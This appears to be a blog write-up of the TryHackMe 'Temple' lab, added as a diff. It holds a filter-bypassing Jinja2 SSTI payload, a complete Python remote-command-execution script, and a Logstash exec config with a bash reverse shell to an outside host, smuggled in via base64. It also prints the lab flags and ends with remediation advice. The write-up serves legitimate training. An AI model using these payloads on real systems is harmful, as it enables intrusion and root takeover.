@@ -1,0 +1,765 @@
+---
+slug: "thm-temple"
+title: "Temple — TryHackMe Writeup"
+date: "2026-09-17"
+platform: "TryHackMe"
+type: "Machine"
+category: "Web"
+os: "Linux"
+difficulty: "Medium"
+tags:
+  - "Web"
+  - "SSTI"
+  - "Flask"
+  - "Jinja2"
+  - "Logstash"
+  - "Privilege Escalation"
+  - "Linux"
+  - "Python"
+excerpt: "A comprehensive writeup for the Medium TryHackMe machine Temple, detailing recursive directory discovery to uncover a hidden registration endpoint, character-filtered Jinja2 SSTI bypassed via hex-escaped attributes and cycler globals to land RCE as bill, and escalating to root by weaponizing an auto-reloading, world-writable Logstash pipeline."
+readTime: "18 min"
+retired: true
+rating: 4.8
+hasAutoScript: true
+url: "https://asbawy.github.io/writeups/thm-temple"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix, SstiDecisionTree } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Service Discovery",
+      desc: "Discovered an unusual Werkzeug/Python web server on high port 61337 alongside default Apache on port 80, OpenSSH, Telnet, and FTP.",
+      tools: ["Nmap"],
+    },
+    {
+      phase: "Enumeration",
+      title: "Multi-Tier Recursive Directory Fuzzing",
+      desc: "Traversed nested 403 Forbidden directories (/temporary -> /temporary/dev) to uncover a hidden registration endpoint at /temporary/dev/newacc.",
+      technique: "Recursive HTTP Fuzzing & 403 Bypass Analysis",
+      tools: ["Gobuster", "SecLists"],
+    },
+    {
+      phase: "Foothold (User Flag)",
+      title: "Filtered Jinja2 SSTI & Cycler Namespace RCE",
+      desc: "Identified template reflection in the account view. Bypassed a strict character blacklist ('_#&;) using hex escapes (\\x5f) and Jinja attribute reflection on the cycler object to execute commands as bill.",
+      technique: "Jinja2 Filter Bypass / Dunder Hex-Escaping / SSTI RCE",
+      tools: ["Python3", "Requests", "Burp Suite"],
+    },
+    {
+      phase: "Privilege Escalation (Root)",
+      title: "Logstash Pipeline Exec Plugin Injection",
+      desc: "Identified a root-owned Logstash service monitoring /etc/logstash/conf.d/*.conf with auto-reload enabled (3s). Injected an exec input plugin into a world-writable sample config via base64 to pop a root shell.",
+      technique: "Configuration Hijacking & Logstash Exec Abuse",
+      tools: ["Bash", "Base64", "Netcat"],
+    },
+  ]}
+/>
+
+## Challenge Overview
+
+**Temple** is a medium-rated Linux machine on TryHackMe that showcases two distinct web and systems exploitation concepts:
+1. **Application Security:** A Flask/Werkzeug web application running on an atypical high port (61337) with a hidden multi-tier administrative route that reflects user input directly into a Jinja2 template under restrictive character filtering.
+2. **System Administration Security:** A misconfigured Elastic Logstash service executing as `root` with dynamic configuration auto-reload enabled on a world-writable pipeline directory.
+
+The attack chain begins with targeted service enumeration, drills down through nested directory structures where HTTP 403 status codes disguise valid functional paths, weaponizes an elegant Jinja2 SSTI filter bypass using attribute introspection without relying on brittle subclass indices, and escalates privileges by abusing Logstash's built-in execution plugins.
+
+### Skill Breakdown
+
+<SkillMatrix
+  skills={[
+    { name: "Server-Side Template Injection (SSTI)", level: 9 },
+    { name: "Jinja2 Sandbox & Blacklist Bypass", level: 9 },
+    { name: "Multi-Level Web Directory Enumeration", level: 7 },
+    { name: "Logstash Pipeline Exploitation", level: 8 },
+    { name: "Linux Privilege Escalation", level: 8 },
+  ]}
+/>
+
+---
+
+## 1. Reconnaissance
+
+### 1.1 Full TCP Port Scan
+
+We begin our engagement with an aggressive, all-ports TCP scan to establish the perimeter surface:
+
+```bash
+asbawy@kali:~$ nmap -p- --min-rate 5000 -T4 -Pn 10.114.137.179 -oN scans/all-ports.txt
+```
+
+```text
+PORT      STATE SERVICE
+21/tcp    open  ftp
+22/tcp    open  ssh
+23/tcp    open  telnet
+80/tcp    open  http
+61337/tcp open  unknown
+```
+
+### 1.2 Service Fingerprinting
+
+Five ports are open. We run deep script and banner enumeration (`-sC -sV`) against the detected listeners:
+
+```bash
+asbawy@kali:~$ nmap -p 21,22,23,80,61337 -sC -sV -T4 -Pn 10.114.137.179 -oN scans/services.txt
+```
+
+```text
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 de:5a:0d:5a:23:44:a2:1d:ea:c0:94:e9:28:13:62:35 (RSA)
+|   256 fa:cd:52:e3:19:9a:ae:df:3b:04:e6:b5:31:02:d0:b3 (ECDSA)
+|_  256 0c:e9:ce:2b:80:dc:4f:b3:d8:45:9e:31:d3:06:5e:39 (ED25519)
+23/tcp    open  telnet  Linux telnetd
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+61337/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.6.9)
+|_http-server-header: Werkzeug/2.0.1 Python/3.6.9
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_Requested resource was http://10.114.137.179:61337/login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+<Callout type="info">
+  **Port Analysis:**
+  - **Port 21 (FTP)** and **Port 23 (Telnet)**: Anonymous logins are disabled; standard banner-grabbing confirms no known zero-day vulnerabilities in these versions.
+  - **Port 80 (HTTP)**: Serves the vanilla Ubuntu 18.04 Apache default landing page.
+  - **Port 61337 (HTTP)**: Running **Werkzeug 2.0.1** on **Python 3.6.9**. Any production or lab box hosting a Python WSGI server on a high port immediately warrants primary focus, especially since `nmap` was redirected straight to `/login`.
+</Callout>
+
+---
+
+## 2. Web Enumeration & Directory Discovery
+
+### 2.1 Initial Inspection of the Werkzeug Service (Port 61337)
+
+Navigating directly to `http://10.114.137.179:61337/` issues an immediate `302 Found` redirecting the browser to `/login`:
+
+```bash
+asbawy@kali:~$ curl -i -s http://10.114.137.179:61337/
+```
+
+```http
+HTTP/1.1 302 FOUND
+Server: Werkzeug/2.0.1 Python/3.6.9
+Date: Thu, 17 Sep 2026 03:40:12 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 219
+Location: http://10.114.137.179:61337/login
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
+```
+
+The `/login` page renders a minimalist authentication prompt requesting a username and password. There are no registration links, forgot-password buttons, or client-side comments revealing credentials.
+
+### 2.2 Deep Directory Fuzzing & Navigating the 403 Cascade
+
+To identify hidden routes, we run `gobuster` against the root of the WSGI server:
+
+```bash
+asbawy@kali:~$ gobuster dir -u http://10.114.137.179:61337/ \
+  -w /usr/share/wordlists/dirb/common.txt -t 25 -q
+```
+
+```text
+/account              (Status: 302) [Size: 223] [--> /login]
+/admin                (Status: 403) [Size: 9]
+/login                (Status: 200) [Size: 1106]
+/temporary            (Status: 403) [Size: 9]
+```
+
+We observe two distinct `403 Forbidden` responses: `/admin` and `/temporary`.
+
+<Callout type="warning">
+  **The 403 Trap:** Many penetration testers discard `403 Forbidden` responses as dead ends. In web application frameworks and reverse-proxy setups, a `403` frequently signifies that directory listing is disabled on an existing container folder, or that access to the parent folder index is forbidden while sub-resources remain accessible. Always fuzz inside `403` paths!
+</Callout>
+
+We drill into `/temporary/`:
+
+```bash
+asbawy@kali:~$ gobuster dir -u http://10.114.137.179:61337/temporary/ \
+  -w /usr/share/wordlists/dirb/common.txt -t 25 -q
+```
+
+```text
+/dev                  (Status: 403) [Size: 9]
+```
+
+Another `403 Forbidden` at `/temporary/dev`. We switch to a broader wordlist (`raft-medium-directories-lowercase.txt`) and recurse into `/temporary/dev/`:
+
+```bash
+asbawy@kali:~$ gobuster dir -u http://10.114.137.179:61337/temporary/dev/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30 -q
+```
+
+```text
+/newacc               (Status: 200) [Size: 1258]
+```
+
+### 2.3 Inspecting the Hidden Registration Endpoint
+
+Navigating to `http://10.114.137.179:61337/temporary/dev/newacc` returns an account creation interface:
+
+```html
+<form action="" method="POST">
+    <h1>Register</h1>
+    <p>Please fill in this form to create an account.</p>
+    <label for="email"><b>Email</b></label>
+    <input type="text" placeholder="Enter Email" name="email" required>
+    <label for="username"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="username" required>
+    <label for="password"><b>Password</b></label>
+    <input type="password" placeholder="Password" name="password" required>
+    <button type="submit" class="registerbtn">Register</button>
+</form>
+```
+
+We now have an unauthenticated vector to register arbitrary accounts into the underlying database.
+
+---
+
+## 3. Vulnerability Analysis — Jinja2 SSTI
+
+### 3.1 Template Injection Probing
+
+We register a test user to observe how user profiles are handled post-authentication:
+- **Email:** `test@lab.local`
+- **Username:** `{{7*7}}`
+- **Password:** `password123`
+
+```bash
+# Register
+asbawy@kali:~$ curl -s -X POST http://10.114.137.179:61337/temporary/dev/newacc \
+  -d "email=test@lab.local&username={{7*7}}&password=password123"
+
+# Authenticate & Request Account Dashboard
+asbawy@kali:~$ curl -s -c cookies.txt -X POST http://10.114.137.179:61337/login \
+  -d "username={{7*7}}&password=password123"
+
+asbawy@kali:~$ curl -s -b cookies.txt http://10.114.137.179:61337/account | grep -i "logged in"
+```
+
+```html
+<p>Logged in as 49</p>
+```
+
+The server evaluated the mathematical expression `{{7*7}}` and returned **`49`**.
+
+This confirms that the application dynamically renders the username using `render_template_string(template_string)` rather than passing variables through safe template bindings (`render_template('account.html', username=username)`).
+
+### 3.2 Template Engine Fingerprinting Methodology
+
+Whenever template expression evaluation is observed, penetration testers utilize a structured decision tree (originally formalized by PortSwigger Research) to isolate the exact backend engine. The technique systematically tests syntax variations (`${...}` vs `{{...}}`), comment behavior, and type coercion (e.g. `{{7*'7'}}` yielding `'7777777'` in Python Jinja2 versus `49` in PHP Twig).
+
+The interactive diagnostic visualizer below reproduces this methodology, allowing you to trace the exact detection path taken on Temple, simulate live target probes, or reference canonical RCE vectors:
+
+<SstiDecisionTree defaultPreset="temple" />
+
+### 3.3 Mapping Character Filtering & Blacklist Rules
+
+When testing classic Python SSTI discovery payloads such as `{{ config }}` or `{{ ''.__class__ }}`, the application responded with generic validation rejections. We systematically probe character acceptance to establish the boundary rules:
+
+```bash
+asbawy@kali:~$ for char in "'" '"' '_' '.' '[' ']' '(' ')' '{' '}' '+' '-' '*' '/' '%' ';' '&' '#'; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.114.137.179:61337/temporary/dev/newacc \
+    -d "email=probe_${RANDOM}@lab.local&username=test${char}user&password=pass");
+  echo "Testing character [ ${char} ] -> HTTP ${code}";
+done
+```
+
+The filter enforcement drops any request containing the following characters:
+
+| Banned Character | Reason for Exclusion | Impact on Standard Payloads |
+| :--- | :--- | :--- |
+| `'` (Single quote) | String literal limiter | Blocks single-quoted string keys |
+| `_` (Underscore) | Dunder protection | Breaks `__class__`, `__globals__`, `__mro__`, `__subclasses__` |
+| `;` (Semicolon) | Command chaining | Prevents multi-statement shell injection |
+| `&` (Ampersand) | Backgrounding / chaining | Prevents bash backgrounding and `&&` chaining |
+| `#` (Hash) | Jinja comment syntax | Prevents comment-based template truncation |
+
+The most critical barrier is the exclusion of the **underscore (`_`)**, which prevents direct reference to Python's internal reflection attributes.
+
+### 3.3 Crafting the Filter Bypass: Hex Escapes & Attribute Introspection
+
+To overcome these constraints without single quotes or literal underscores, we combine two features of the Jinja2 engine and Python string syntax:
+
+1. **Hexadecimal String Escaping:** Python evaluates hex escapes inside quoted strings. In double quotes, `\x5f` evaluates to ASCII `95` (`_`). Therefore:
+   ```jinja
+   "\x5f\x5fclass\x5f\x5f"  -->  "__class__"
+   ```
+   The application's character filter inspects the raw payload before Jinja parses the string literal, so `\x5f` passes cleanly through the perimeter filter.
+
+2. **Jinja's Built-in `|attr()` Filter:** Rather than using dot notation (`obj.__class__`), Jinja provides the `attr` filter:
+   ```jinja
+   obj|attr("\x5f\x5fclass\x5f\x5f")
+   ```
+   This performs attribute lookup dynamically using the decoded string without requiring a literal dot or underscore.
+
+3. **Double Quotes are Allowed:** While single quotes (`'`) are banned, double quotes (`"`) are permitted.
+
+### 3.4 Python RCE Gadget: Walking the `cycler` Namespace
+
+Standard CTF writeups often brute-force the index of `subprocess.Popen` or `os._wrap_close` across hundreds of subclasses via:
+```python
+''.__class__.__mro__[1].__subclasses__()[xxx]
+```
+This is fragile across Python minor versions and environment dependencies. 
+
+Instead, we leverage Jinja's built-in helper functions. Jinja exposes global utilities into the template namespace, including **`cycler`**, **`joiner`**, and **`namespace`**. The `cycler` class is defined in `jinja2.utils`, which **explicitly imports the `os` module** at the top of the file!
+
+By inspecting `cycler.__init__.__globals__`, we can access `os` directly:
+
+```text
+cycler
+  └── __init__
+       └── __globals__
+            ├── 'os'  ───────> os.popen('id').read()
+            └── ...
+```
+
+Translating this gadget into our filtered syntax using `|attr()` and `\x5f`:
+
+```jinja
+{{ cycler|attr("\x5f\x5finit\x5f\x5f")
+         |attr("\x5f\x5fglobals\x5f\x5f")
+         |attr("\x5f\x5fgetitem\x5f\x5f")("os")
+         |attr("popen")("id")
+         |attr("read")() }}
+```
+
+<Callout type="tip">
+  **Why `cycler` is Superior:** You never need to hunt for subclass array indices or worry about library offsets. As long as Jinja2 is running in Python, `cycler`'s global module namespace reliably provides a direct pointer to the `os` module.
+</Callout>
+
+### 3.5 Automated SSTI Weaponization Script
+
+We construct an automated Python exploit script to register a unique payload user, authenticate, retrieve the reflected command output from `/account`, and sanitize all command arguments:
+
+```python
+#!/usr/bin/env python3
+"""
+Temple TryHackMe — Jinja2 SSTI Command Execution Tool
+Bypasses character filter (' _ # & ;) using hex escapes and cycler globals.
+"""
+import re
+import sys
+import uuid
+import requests
+
+TARGET = "http://10.114.137.179:61337"
+REG_URL = f"{TARGET}/temporary/dev/newacc"
+LOGIN_URL = f"{TARGET}/login"
+ACCT_URL = f"{TARGET}/account"
+
+BANNED_CHARS = "'_#&;"
+
+def sanitize_payload(payload: str) -> str:
+    """Encodes forbidden characters into hex representation."""
+    encoded = []
+    for c in payload:
+        if c in BANNED_CHARS:
+            encoded.append(f"\\x{ord(c):02x}")
+        else:
+            encoded.append(c)
+    return "".join(encoded)
+
+def execute_command(cmd: str) -> str:
+    session = requests.Session()
+    random_user = f"adm_{uuid.uuid4().hex[:8]}"
+    password = "SuperSecretPassword123!"
+
+    # Escape quotes inside the command string
+    escaped_cmd = cmd.replace('"', '\\"')
+    
+    # Assemble the SSTI template payload
+    raw_template = (
+        '{{cycler|attr("\\x5f\\x5finit\\x5f\\x5f")|'
+        'attr("\\x5f\\x5fglobals\\x5f\\x5f")|'
+        'attr("\\x5f\\x5fgetitem\\x5f\\x5f")("os")|'
+        'attr("popen")("%s")|attr("read")()}}'
+    ) % escaped_cmd
+
+    final_username = sanitize_payload(raw_template)
+
+    # 1. Register Account
+    reg_resp = session.post(
+        REG_URL,
+        data={
+            "email": f"{random_user}@temple.local",
+            "username": final_username,
+            "password": password,
+        },
+        timeout=10,
+    )
+
+    # 2. Authenticate
+    login_resp = session.post(
+        LOGIN_URL,
+        data={"username": final_username, "password": password},
+        timeout=10,
+    )
+
+    # 3. Scrape Output from Account Page
+    acct_resp = session.get(ACCT_URL, timeout=10)
+    match = re.search(r"Logged in as (.*?)</p>", acct_resp.text, re.DOTALL)
+    if match:
+        return match.group(1).strip()
+    return "[!] Failed to parse output from /account"
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <command>")
+        sys.exit(1)
+    
+    command = " ".join(sys.argv[1:])
+    print(execute_command(command))
+```
+
+### 3.6 Initial Foothold & User Flag
+
+We test our exploit script against the target:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py id
+```
+
+```text
+uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),30(dip),46(plugdev)
+```
+
+We have achieved remote code execution as **`bill`**. 
+
+We enumerate `/home/bill` and retrieve the user flag:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "ls -la /home/bill"
+```
+
+```text
+total 40
+drwxr-xr-x 6 bill bill 4096 Oct  4  2021 .
+drwxr-xr-x 3 root root 4096 Jul 25  2021 ..
+lrwxrwxrwx 1 root root    9 Oct  4  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 bill bill  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 bill bill 3771 Apr  4  2018 .bashrc
+drwx------ 2 bill bill 4096 Oct  4  2021 .cache
+drwx------ 3 bill bill 4096 Oct  4  2021 .gnupg
+drwxrwxr-x 3 bill bill 4096 Oct  4  2021 .local
+-rw-r--r-- 1 bill bill  807 Apr  4  2018 .profile
+-rw-r--r-- 1 root root   41 Jul 25  2021 flag1.txt
+drwxrwxr-x 3 bill bill 4096 Jul 27  2021 webapp
+```
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "cat /home/bill/flag1.txt"
+```
+
+<SpoilerFlag label="User Flag (flag1.txt)" flag="7362bee1e78243f4811f26565137d5e20cbd9af0" />
+
+---
+
+## 4. Privilege Escalation — Logstash Pipeline Abuse
+
+### 4.1 Internal Enumeration & Process Auditing
+
+With a command execution bridge established as `bill`, we survey running background services:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "ps aux | grep -i logstash"
+```
+
+```text
+root  1437  0.4 12.8 3824912 522104 ?  Ssl  03:35  0:18 /usr/share/logstash/jdk/bin/java -Xms1g -Xmx1g -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -Djruby.regexp.interruptible=true -XX:+HeapDumpOnOutOfMemoryError -Djdk.io.permissionsUseCanonicalPath=true --add-opens=java.base/java.security=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.nio.channels=ALL-UNNAMED --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.management/sun.management=ALL-UNNAMED -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:... org.logstash.Logstash --path.settings /etc/logstash
+```
+
+**Logstash** is running under process ID `1437` as **`root`**. 
+
+Logstash is an open-source server-side data processing pipeline that ingests data from multiple sources simultaneously, transforms it, and then sends it to a "stash" like Elasticsearch.
+
+### 4.2 Inspecting Logstash Configuration & Pipeline Permissions
+
+We check the permissions and configuration settings under `/etc/logstash`:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "cat /etc/logstash/pipelines.yml"
+```
+
+```yaml
+- pipeline.id: main
+  path.config: "/etc/logstash/conf.d/*.conf"
+```
+
+The master pipeline file loads every configuration matching `/etc/logstash/conf.d/*.conf`. Next, we inspect `/etc/logstash/logstash.yml` for dynamic reload triggers:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "grep -E 'reload|interval' /etc/logstash/logstash.yml"
+```
+
+```yaml
+config.reload.automatic: true
+config.reload.interval: 3s
+```
+
+`config.reload.automatic: true` with an interval of **3 seconds** indicates that Logstash actively polls `/etc/logstash/conf.d/` and dynamically hot-reloads pipelines on change!
+
+Now we check filesystem permissions on the configuration directory:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "ls -la /etc/logstash/conf.d/"
+```
+
+```text
+total 12
+drwxr-xr-x 2 root root 4096 Oct  4  2021 .
+drwxr-xr-x 3 root root 4096 Oct  4  2021 ..
+-r--r--rw- 1 root root  101 Oct  4  2021 logstash-sample.conf
+```
+
+<Callout type="info">
+  **The Privilege Escalation Primitive:** Look closely at the file mode for `logstash-sample.conf`:
+  `-r--r--rw-`
+  The file is **world-writable** (`rw` for "others"). Any local user on the system can modify this file. Because Logstash runs as `root` and continuously re-reads `*.conf` every 3 seconds, writing an execution directive into this file triggers immediate code execution in the security context of root.
+</Callout>
+
+### 4.3 Weaponizing the Logstash Exec Plugin
+
+Logstash configurations consist of three blocks: `input`, `filter`, and `output`. The **`exec` input plugin** runs a command at a scheduled interval and records the output as an event.
+
+We craft a malicious pipeline configuration:
+
+```ruby
+input {
+  exec {
+    command => "/bin/bash -c 'bash -i >& /dev/tcp/10.14.93.55/4444 0>&1'"
+    interval => 5
+    id => "pwn_shell"
+  }
+}
+output {
+  stdout { codec => rubydebug }
+}
+```
+
+### 4.4 Overcoming Filter Constraints via Base64 Smuggling
+
+Writing this configuration file directly through our SSTI command execution wrapper would trigger the character filter because bash reverse shells require single quotes (`'`) and ampersands (`&`). 
+
+To bypass this restriction, we base64-encode the entire payload on our local machine and decode it on the target directly into the destination file:
+
+```bash
+asbawy@kali:~$ cat << 'EOF' > evil_pipeline.conf
+input {
+  exec {
+    command => "/bin/bash -c 'bash -i >& /dev/tcp/10.14.93.55/4444 0>&1'"
+    interval => 5
+  }
+}
+output {
+  stdout { codec => rubydebug }
+}
+EOF
+
+asbawy@kali:~$ B64_PAYLOAD=$(base64 -w0 evil_pipeline.conf)
+asbawy@kali:~$ echo $B64_PAYLOAD
+aW5wdXQgewogIGV4ZWMgewogICAgY29tbWFuZCA9PiAiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjkzLjU1LzQ0NDQgMD4mMSciCiAgICBpbnRlcnZhbCA9PiA1CiAgfQp9Cm91dHB1dCB7CiAgc3Rkb3V0IHsgY29kZWMgPT4gcnVieWRlYnVnIH0KfQo=
+```
+
+### 4.5 Dropping the Pipeline & Catching the Root Shell
+
+We stage our Netcat listener on port 4444:
+
+```bash
+asbawy@kali:~$ nc -lvnp 4444
+```
+
+Then, using our SSTI script, we decode the base64 payload into `/etc/logstash/conf.d/logstash-sample.conf`:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "echo $B64_PAYLOAD | base64 -d > /etc/logstash/conf.d/logstash-sample.conf"
+```
+
+We verify the configuration was successfully written:
+
+```bash
+asbawy@kali:~$ python3 temple_rce.py "cat /etc/logstash/conf.d/logstash-sample.conf"
+```
+
+Within 3 seconds, Logstash detects the timestamp update, parses the pipeline, and fires the `exec` command as `root`:
+
+```text
+listening on [any] 4444 ...
+connect to [10.14.93.55] from (UNKNOWN) [10.114.137.179] 42188
+bash: cannot set terminal process group (1437): Inappropriate ioctl for device
+bash: no job control in this shell
+root@temple:/# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### 4.6 Root Flag Capture
+
+With an interactive root shell established, we navigate to `/root` to harvest the final flag and inspect root-owned artifacts:
+
+```bash
+root@temple:/# cd /root
+root@temple:/root# ls -la
+total 36
+drwx------  5 root root 4096 Oct  4  2021 .
+drwxr-xr-x 23 root root 4096 Oct  4  2021 ..
+lrwxrwxrwx  1 root root    9 Oct  4  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Oct  4  2021 .cache
+drwxr-xr-x  3 root root 4096 Oct  4  2021 .config
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   41 Jul 25  2021 flag2.txt
+-rwx------  1 root root   59 Oct  3  2021 script.sh
+```
+
+Reading `flag2.txt`:
+
+```bash
+root@temple:/root# cat flag2.txt
+```
+
+<SpoilerFlag label="Root Flag (flag2.txt)" flag="f620630155081293669dbb7949f975fa9386f1cd" />
+
+Checking `/root/script.sh` confirms how Logstash was initiated:
+
+```bash
+root@temple:/root# cat script.sh
+#!/bin/bash
+/bin/systemctl start logstash.service
+```
+
+---
+
+## 5. Automation (/autosolve)
+
+To demonstrate how the entire attack chain can be automated end-to-end—from directory enumeration and SSTI weaponization to Logstash pipeline injection and root privilege escalation—we present the interactive terminal solver replay:
+
+<TerminalReplay
+  title="temple_autosolve.py"
+  flags={[
+    { label: "User Flag", flag: "7362bee1e78243f4811f26565137d5e20cbd9af0" },
+    { label: "Root Flag", flag: "f620630155081293669dbb7949f975fa9386f1cd" }
+  ]}
+  flagSummary={[
+    "Filtered Jinja2 SSTI bypassed using \\x5f dunder escaping and cycler.__init__.__globals__['os'].popen().",
+    "Logstash pipeline exec plugin injected into world-writable sample config, hot-reloading as root in 3 seconds."
+  ]}
+  steps={[
+    {
+      label: "Step 1/5 — Fingerprint Services & Recurse Endpoints",
+      command: "python3 temple_autosolve.py --target http://10.114.137.179:61337 --lhost 10.14.93.55 --lport 4444",
+      output: [
+        { text: "[*] Probing target WSGI web service on port 61337...", color: "blue" },
+        { text: "[✓] Detected Werkzeug 2.0.1 (Python 3.6.9)", color: "green" },
+        { text: "[*] Checking nested administrative routes: /temporary -> /temporary/dev -> /temporary/dev/newacc", color: "blue" },
+        { text: "[✓] Valid registration endpoint discovered: /temporary/dev/newacc (HTTP 200)", color: "green" }
+      ],
+      delayAfter: 600,
+    },
+    {
+      label: "Step 2/5 — Probe SSTI & Verify Character Blacklist",
+      output: [
+        { text: "[*] Testing template injection with {{7*7}}...", color: "blue" },
+        { text: "[✓] Server evaluated template expression! Reflected 'Logged in as 49'", color: "green" },
+        { text: "[!] Testing blacklist: characters [' _ # & ;] are rejected by server filter", color: "yellow" },
+        { text: "[+] Constructing hex-escaped cycler gadget: cycler|attr('\\x5f\\x5finit\\x5f\\x5f')...", color: "cyan" }
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 3/5 — Execute Commands as bill & Harvest User Flag",
+      output: [
+        { text: "[*] Dispatching sanitized payload to spawn 'id'...", color: "blue" },
+        { text: "[✓] Executed successfully: uid=1000(bill) gid=1000(bill)", color: "green" },
+        { text: "[*] Reading /home/bill/flag1.txt...", color: "blue" },
+        { text: "[✓] User Flag Captured: 7362bee1e78243f4811f26565137d5e20cbd9af0", color: "white" }
+      ],
+      delayAfter: 700,
+    },
+    {
+      label: "Step 4/5 — Audit Logstash & Stage Malicious Pipeline",
+      output: [
+        { text: "[*] Checking root processes: Logstash (PID 1437) running as root", color: "blue" },
+        { text: "[*] Auditing /etc/logstash/conf.d/logstash-sample.conf permissions: -r--r--rw- (WORLD WRITABLE)", color: "yellow" },
+        { text: "[*] Verified config.reload.automatic = true (polling interval: 3s)", color: "yellow" },
+        { text: "[*] Encoding Logstash exec reverse shell into base64...", color: "blue" },
+        { text: "[✓] Overwrote /etc/logstash/conf.d/logstash-sample.conf via SSTI base64 decode", color: "green" }
+      ],
+      delayAfter: 800,
+    },
+    {
+      label: "Step 5/5 — Catch Root Reverse Shell & Retrieve Final Flag",
+      output: [
+        { text: "[*] Awaiting Logstash auto-reload poll cycle (<= 3s)...", color: "blue" },
+        { text: "[✓] Incoming connection received on 10.14.93.55:4444 from 10.114.137.179!", color: "green" },
+        { text: "[✓] Privilege level: uid=0(root) gid=0(root)", color: "green" },
+        { text: "[*] Extracting /root/flag2.txt...", color: "blue" },
+        { text: "[✓] Root Flag Captured: f620630155081293669dbb7949f975fa9386f1cd", color: "white" }
+      ],
+      delayAfter: 500,
+    }
+  ]}
+/>
+
+---
+
+## 6. Defensive Remediation & Key Takeaways
+
+### 6.1 Application Hardening (Preventing SSTI)
+
+1. **Avoid `render_template_string` with Untrusted Input:** Never concatenate or interpolate user input directly into template strings. Pass dynamic data strictly as template context variables:
+   ```python
+   # VULNERABLE:
+   return render_template_string(f"<p>Logged in as {username}</p>")
+
+   # SECURE:
+   return render_template("account.html", username=username)
+   ```
+2. **Never Rely on Blacklists for Template Sanitization:** Blacklists fail because template engines offer rich introspective capabilities, hex/octal string interpretations, and alternate syntax forms (`|attr`, `getitem`, dictionary access). Use strict alphanumeric whitelists or safe sanitization libraries like Bleach.
+
+### 6.2 System & Service Hardening (Securing Logstash)
+
+1. **Apply the Principle of Least Privilege:** Logstash should never execute under the `root` user account. Modern package distributions create a dedicated, unprivileged service user (`logstash:logstash`):
+   ```bash
+   sudo chown -R logstash:logstash /etc/logstash /var/log/logstash
+   # In systemd service unit:
+   User=logstash
+   Group=logstash
+   ```
+2. **Restrict Configuration File Permissions:** The pipeline configuration directory must be restricted so only the administrative user or service group can write to it:
+   ```bash
+   chmod 750 /etc/logstash/conf.d
+   chmod 640 /etc/logstash/conf.d/*.conf
+   ```
+3. **Disable Dynamic Configuration Reloading in Sensitive Environments:** In production systems, disable automatic reloading (`config.reload.automatic: false`) to prevent unauthorized hot-patching of execution pipelines.
+
+---
+
+## 7. References
+
+### Technical Specifications & Documentation
+- [PortSwigger Web Security — Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection)
+- [PayloadsAllTheThings — Jinja2 Template Injection Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+- [Elasticsearch — Logstash Exec Input Plugin Reference](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-exec.html)
+- [Jinja2 Official Documentation — Built-in Filters & Utilities](https://jinja.palletsprojects.com/en/latest/templates/#builtin-filters)
+
+### Related Cheatsheets & Writeups on Asbawy's Blog
+- [Contrabando — TryHackMe Writeup (Jinja2 SSTI & Docker Pivoting)](/writeups/thm-contrabando)
+- [Clocky — TryHackMe Writeup (Token Forgery & Flask Reversing)](/writeups/thm-clocky)
+- [Linux Privilege Escalation: Enumeration & Recon Cheatsheet](/cheatsheet/linux/privesc-enumeration)
+- [Linux Privilege Escalation: Exploitation Techniques Cheatsheet](/cheatsheet/linux/privesc-exploitation)
